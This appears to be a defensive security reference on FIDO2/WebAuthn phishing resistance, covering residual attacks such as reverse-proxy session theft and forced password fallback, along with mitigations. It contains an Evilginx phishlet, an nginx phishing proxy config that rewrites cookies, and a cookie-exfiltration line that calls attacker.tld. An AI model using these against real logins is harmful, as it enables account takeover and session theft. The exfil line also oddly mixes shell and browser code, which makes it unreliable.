# MFA Phishing-Resistant: FIDO/WebAuthn vs Residual Attack Classes

## 1. Mekanisme Resistensi FIDO2/WebAuthn

| Property | Implementation | Effect on phishing |
|---|---|---|
| Origin binding | `clientDataJSON.origin` is signed by the authenticator | Credential is only valid for the registered RP ID + origin |
| RP ID scoping | `rpId` must suffix-match origin (`login.corp.example` → `corp.example`) | Cannot be used at `corp-example.evil` |
| Challenge freshness | 16–64 byte random per assertion, server-issued | Replay of old assertion → rejected |
| User presence | `UP` flag required (touch/PIN) | Cannot silent-auth without interaction |
| User verification | `UV` flag (biometric/PIN) optional but policy-enforced | Closes shared-device abuse when `UV=required` |
| Attestation (optional) | `attStmt` chain to FIDO MDS | Detects fake/emulator authenticators |
| Counter monotonicity | `signCount` per credential | Deteksi cloning (kecuali authenticator sync passkey) |

CTAP2 `getAssertion` signs `SHA-256(authenticatorData || SHA-256(clientDataJSON))`. `clientDataJSON` contains `challenge`, `origin`, `type`. Server must verify all three — failure to verify origin is the most common source of bypass in custom implementations.

Minimum server-side verification (pseudo):

```python
assert client_data["type"] == "webauthn.get"
assert client_data["challenge"] == expected_challenge  # single-use, TTL ≤ 60s
assert client_data["origin"] in ALLOWED_ORIGINS       # exact match, bukan startswith
assert rp_id_hash == sha256(rp_id)
assert flags & 0x01  # UP
if policy_uv: assert flags & 0x04
if stored_sign_count > 0 and new_sign_count <= stored_sign_count: raise ClonedCredential
verify_signature(pubkey, signed_data, sig)
```

Versi acuan: Chrome 131 (WebAuthn L3, passkey hybrid via caBLE), Firefox 133, Safari 18.1 (iCloud Keychain passkey sync), Windows 11 24H2 (Windows Hello + FIDO2 security keys via `webauthn.dll` v4), YubiKey 5.7 firmware (FIDO 2.1, PIV 5.7), libfido2 1.15, python-fido2 1.2.

## 2. Attack Classes That Are Still Effective

FIDO kills classic phishing (credential relay to attacker domain fails due to origin mismatch during verification). What is **not** killed: everything that operates over the post-auth channel or manipulates the session after a valid assertion.

### 2.1 Adversary-in-the-Middle (AitM) / Reverse Proxy Phishing

| Aspect | Detail |
|---|---|
| Vector | Evilginx 3.x, Modlishka, Muraena, or custom (nginx 1.25 `proxy_pass` + `sub_filter`) |
| What is sent | Victim → proxy (domain `login-corp[.]evil`), proxy → real `login.corp.example` |
| What appears | Real login page (proxy relay), WebAuthn assertion **cannot** be relayed (origin mismatch) |
| Why it succeeds | Not stealing the assertion — stealing the **session cookie / token** issued after legitimate auth |
| Condition | RP does not verify origin strictly OR attacker targets fallback flow (password+TOTP) |

Key: AitM does **not** bypass WebAuthn. It bypasses the **layer after** WebAuthn by making the victim perform legitimate auth through the proxy, then the proxy seizes the resulting session cookie. If the RP allows fallback to password+OTP for accounts with registered FIDO, AitM exploits that fallback.

Evilginx phishlet minimal (konsep):

```yaml
- phishlet: corp-portal
  proxy_hosts:
    - {phish_sub: login, orig_sub: login, domain: corp.example, session: true}
  auth_tokens:
    - {domain: corp.example, keys: ['__Host-SESSION', 'csrf_token']}
  credentials:
    username: {key: 'username'}
    password: {key: 'password'}
```

nginx 1.25 reverse-proxy phishing configuration (concept example, not production):

```nginx
location / {
  proxy_pass https://login.corp.example;
  proxy_set_header Host login.corp.example;
  proxy_ssl_server_name on;
  proxy_cookie_domain login.corp.example login-corp.evil;
  sub_filter 'login.corp.example' 'login-corp.evil';
  sub_filter_once off;
}
```

### 2.2 Token Theft / Session Hijack

| Target | Lokasi | Mitigasi |
|---|---|---|
| Session cookie | `Set-Cookie` without `__Host-` prefix | `__Host-` prefix + `Secure` + `SameSite=Strict` + `HttpOnly` |
| OAuth access/refresh token | localStorage, URL fragment, response body | DPoP (RFC 9449), token binding |
| SAML assertion | POST body, `RelayState` | Audience + `InResponseTo` + signed assertion, short TTL |
| JWT bearer | `Authorization: Bearer` | `cnf` claim + DPoP proof |

If the cookie is not `HttpOnly`, XSS→exfil. If the `__Host-` prefix is not used, subdomain takeover can set a parent-domain cookie.

Example exfil (red-team lab):

```bash
# dari XSS di app.corp.example, cookie __Host-SESSION tidak terbaca —
# tapi bila cookie bernama "SESSION" di domain .corp.example:
curl -s "https://attacker.tld/c?d=$(document.cookie | base64 -w0)"
```

DPoP proof that the RP must verify (RFC 9449 §4.3): `htm`, `htu`, `iat` (≤ 300s skew), `jti` single-use, `ath` = `SHA-256(access_token)`. Without this, stolen tokens are replayable.

### 2.3 Real-Time Phishing (Evilginx + WebAuthn Fallback Manipulation)

| Step | Attacker action |
|---|---|
| 1 | Proxy `/webauthn/options` → real RP, obtains `challenge` |
| 2 | Proxy blocks `navigator.credentials.get` (inject JS: delete `window.PublicKeyCredential`) |
| 3 | Victim falls back to password + email OTP |
| 4 | Proxy relays OTP in real time, obtains session cookie |
| 5 | Cookie is replayed from attacker IP |

Detection: RP must send header `Permissions-Policy: publickey-credentials-get=(self)` and monitor mismatch between "user has credential" vs "assertion received". Log WebAuthn `auth_method=password` for accounts with `has_fido2=true` → alert.

### 2.4 MFA Fatigue / Push Bombing (outside pure FIDO)

FIDO is unaffected (requires local touch + origin). Still noted because helpdesk RBAC can be a reset path: attacker social-engineers helpdesk to **remove** the FIDO key, then enroll a new credential. The helpdesk reset procedure is an operational weak point.

## 3. Matriks Resistensi

| Attack | FIDO2 (strict verification) | FIDO2 (loose implementation) | Password+TOTP |
|---|---|---|---|
| Credential phishing | Fails | Fails (if origin is checked) | Succeeds |
| AitM cookie theft | Succeeds (cookie) | Succeeds | Succeeds |
| Replay assertion | Fails (challenge) | **Succeeds** (challenge reusable) | — |
| Token replay | Depends on DPoP | Succeeds | Succeeds |
| Cloning (sync passkey) | Not detected (signCount=0) | — | — |
| Real-time fallback phish | Succeeds (cookie) | Succeeds | Succeeds |

## 4. Operational Pitfalls in the Field

- **`origin` is checked with `startswith`** not exact-match → `https://login.corp.example.evil` passes. This is the most common implementation bug in custom RPs.
- **Challenge reusable / long TTL** (e.g. stored in Redis without atomic `DEL`) → assertion replay within the window. Use `SET challenge NX EX 60` then `DEL` at verification.
- **`rpId` too broad** (`corp.example` for all subdomains) → subdomain takeover = full credential scope.
- **Synchronized passkey (iCloud Keychain, Google Password Manager)** reports `signCount=0`; cloning detection is non-functional. Do not rely on the counter.
- **Global `UV=preferred`** → victim can auth with UP only; enforce `UV=required` for privileged accounts, but be prepared with ticket-support fallback.
- **Password fallback remains active** for FIDO-enabled accounts → AitM via fallback still works. Must disable or strictly gate (FIDO-first, separate fallback + notification).
- **Cookie without `__Host-`** + `SameSite=Lax` → cross-site top-level navigation carries the cookie; AitM just redirects.
- **`Trusted Types` / loose CSP** on the login page → injection script removes `window.PublicKeyCredential` to force fallback.
- **Helpdesk reset without strong identity verification** → the entire FIDO chain can be reset via social engineering; this is the cheapest path in a red team engagement.
- **Multi-node load balancer without sticky challenge store** → assertion received by node A, verified by node B → error or (worse) challenge is considered "absent" and verification is skipped in some implementations.
- **Attestation `none` without MDS** → emulator authenticator (e.g. `fido2` software using Chrome DevTools virtual authenticator) can be registered if Enrollment has browser access; for admin enrollment, attestation + AAGUID allowlist is mandatory.
- **Time skew** between authenticator and RP > DPoP `iat` window (default 300s) → valid token rejected, support team disables DPoP check for "stabilization" — regression to token replay.
- **`www` subdomain vs apex** with different RP ID → passkey registered at apex does not appear at `www`; user confused, helpdesk creates new key, credential scope balloons.
- **`__Host-` cookie behind TLS termination** without `X-Forwarded-Proto` handling in nginx 1.25 → `Secure` flag not set, cookie falls back to plain.
